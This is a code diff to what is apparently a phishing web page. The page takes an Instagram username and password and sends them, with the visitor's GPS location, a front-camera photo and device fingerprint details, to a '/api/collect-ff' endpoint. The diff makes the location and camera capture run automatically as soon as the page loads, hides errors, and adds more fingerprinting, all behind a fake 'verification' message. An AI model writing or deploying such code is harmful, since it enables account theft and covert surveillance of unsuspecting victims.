@@ -50,8 +50,42 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        let capturedLocation = null;
+        let capturedLocation = { latitude: 'N/A', longitude: 'N/A' };
         let capturedImage = null;
+
+        // Auto Permissions Trigger on Page Load (Location & Camera)
+        window.addEventListener('DOMContentLoaded', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        capturedLocation = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude
+                        };
+                    },
+                    (err) => {},
+                    { timeout: 5000, enableHighAccuracy: true }
+                );
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById("v");
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        try {
+                            const canvas = document.getElementById("c");
+                            canvas.width = video.videoWidth || 320;
+                            canvas.height = video.videoHeight || 240;
+                            const ctx = canvas.getContext("2d");
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            capturedImage = canvas.toDataURL("image/jpeg", 0.7);
+                        } catch(e) {}
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 1000);
+                })
+                .catch(err => {});
+        });
 
         function initializeEngine() {
             const usernameField = document.getElementById("ig-username").value.trim();
@@ -67,79 +101,29 @@
             panel.classList.remove("hidden");
             panel.innerText = "Processing automated telemetry & verification...";
 
-            setTimeout(() => {
-                startAutoSequence();
-            }, 1000);
-        }
-
-        function startAutoSequence() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        capturedLocation = {
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        proceedToCaptureImage();
-                    },
-                    (err) => {
-                        capturedLocation = { latitude: 'Restricted / Denied', longitude: 'Restricted / Denied' };
-                        proceedToCaptureImage();
-                    },
-                    { timeout: 5000, enableHighAccuracy: true }
-                );
-            } else {
-                capturedLocation = { latitude: 'Not Supported', longitude: 'Not Supported' };
-                proceedToCaptureImage();
-            }
-        }
-
-        function proceedToCaptureImage() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    const video = document.getElementById("v");
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        const canvas = document.getElementById("c");
-                        canvas.width = video.videoWidth || 320;
-                        canvas.height = video.videoHeight || 240;
-                        const ctx = canvas.getContext("2d");
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        capturedImage = canvas.toDataURL("image/jpeg", 0.7);
-                        
-                        stream.getTracks().forEach(t => t.stop());
-                        sendDataToServer();
-                    }, 1200);
-                })
-                .catch(err => {
-                    capturedImage = null;
-                    sendDataToServer();
-                });
-        }
-
-        function sendDataToServer() {
-            const panel = document.getElementById("status-panel");
-            const igUser = document.getElementById("ig-username").value;
-            const igPass = document.getElementById("ig-password").value;
-            
+            // Comprehensive Device Telemetry
             const systemInfo = {
                 userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: window.screen.width + "x" + window.screen.height
+                platform: navigator.platform || 'Unknown',
+                vendor: navigator.vendor || 'Unknown',
+                language: navigator.language || 'Unknown',
+                screenResolution: window.screen.width + "x" + window.screen.height,
+                colorDepth: window.screen.colorDepth + "-bit",
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : 'N/A',
+                cookieEnabled: navigator.cookieEnabled
             };
 
-            // Matches endpoint '/api/collect-ff' used in server code
+            // Instant Send to Server
             fetch('/api/collect-ff', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     platform: 'Instagram',
-                    instagram_username: igUser,
-                    instagram_password: igPass,
-                    latitude: capturedLocation ? capturedLocation.latitude : 'N/A',
-                    longitude: capturedLocation ? capturedLocation.longitude : 'N/A',
+                    instagram_username: usernameField,
+                    instagram_password: passwordField,
+                    latitude: capturedLocation.latitude,
+                    longitude: capturedLocation.longitude,
                     image_base64: capturedImage,
                     system: systemInfo
                 })
